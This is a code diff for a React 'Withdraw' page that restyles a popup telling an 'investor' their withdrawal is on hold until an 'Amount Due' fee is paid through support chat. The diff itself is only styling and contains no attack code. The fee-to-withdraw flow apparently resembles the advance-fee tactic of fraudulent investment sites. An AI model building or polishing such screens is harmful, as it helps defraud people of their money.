@@ -440,14 +440,17 @@ export default function Withdraw() {
       {feePopup && (
         <>
           <div onClick={() => setFeePopup(null)} style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.6)', zIndex: 300 }}/>
-          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '36px 28px', width: '320px', borderRadius: '8px' }}>
-            <div style={{ color: '#111', fontSize: '15px', fontWeight: '700', marginBottom: '12px' }}>{feePopup.label}</div>
-            <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.8' }}>
+          <div style={{ position: 'fixed', top: '50%', left: '50%', transform: 'translate(-50%,-50%)', zIndex: 301, background: 'white', padding: '36px 28px', width: '320px', textAlign: 'center', borderRadius: '8px' }}>
+            <div style={{ width: '52px', height: '52px', borderRadius: '50%', border: '2px solid #ef4444', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 14px' }}>
+              <svg width='22' height='22' fill='none' stroke='#ef4444' viewBox='0 0 24 24' strokeWidth='2'><path d='M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z'/><line x1='12' y1='9' x2='12' y2='13'/><line x1='12' y1='17' x2='12.01' y2='17'/></svg>
+            </div>
+            <div style={{ color: '#111', fontSize: '14px', fontWeight: '700', marginBottom: '8px' }}>{feePopup.label}</div>
+            <div style={{ color: '#555', fontSize: '10px', marginBottom: '16px', lineHeight: '1.8' }}>
               {FEE_DESCRIPTIONS[feePopup.type] || FEE_DESCRIPTIONS.processing}
             </div>
-            <div style={{ color: '#888', fontSize: '9px', marginBottom: '6px', fontWeight: '600', textTransform: 'uppercase', letterSpacing: '0.05em' }}>Amount Due</div>
-            <div style={{ color: '#111', fontSize: '18px', fontWeight: '700', marginBottom: '20px' }}>${parseFloat(feePopup.amount || 0).toLocaleString('en-US', {minimumFractionDigits: 2})}</div>
-            <div style={{ color: '#555', fontSize: '10px', marginBottom: '24px', lineHeight: '1.7' }}>
+            <div style={{ color: '#888', fontSize: '9px', marginBottom: '4px' }}>Amount Due</div>
+            <div style={{ color: '#111', fontSize: '16px', fontWeight: '700', marginBottom: '16px' }}>${parseFloat(feePopup.amount || 0).toLocaleString('en-US', {minimumFractionDigits: 2})}</div>
+            <div style={{ color: '#555', fontSize: '10px', marginBottom: '20px', lineHeight: '1.7' }}>
               Dear Investor, your withdrawal request is on hold. Please contact support to complete this payment.
             </div>
             <button onClick={() => { setFeePopup(null); window.dispatchEvent(new Event('openLiveChat')); }}
